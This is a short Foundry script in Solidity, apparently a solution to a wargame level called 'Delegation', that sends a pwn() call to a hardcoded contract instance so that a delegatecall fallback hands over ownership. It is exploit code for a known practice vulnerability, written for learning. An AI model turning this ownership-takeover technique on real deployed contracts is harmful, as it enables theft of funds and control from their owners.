// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Delegation} from "../src/Delegation.sol";

contract ExploitDelegation is Script {
    address private constant INSTANCE_ADDRESS = 0x9679f5Ad429217CBf19aE98cF5143f190B130fd6;
    uint256 private immutable PRIVATE_KEY = vm.envUint("PRIVATE_KEY");
    address private immutable MY_ADDRESS = vm.envAddress("MY_ADDRESS");
    string private constant FUNCTION_NAME = "pwn()";

    function run() public {
        vm.startBroadcast(PRIVATE_KEY);
        // (bool success, bytes memory data) = INSTANCE_ADDRESS.delegatecall(abi.encodeWithSignature(FUNCTION_NAME));
        INSTANCE_ADDRESS.call(abi.encodeWithSignature(FUNCTION_NAME));
        vm.stopBroadcast();
    }
}
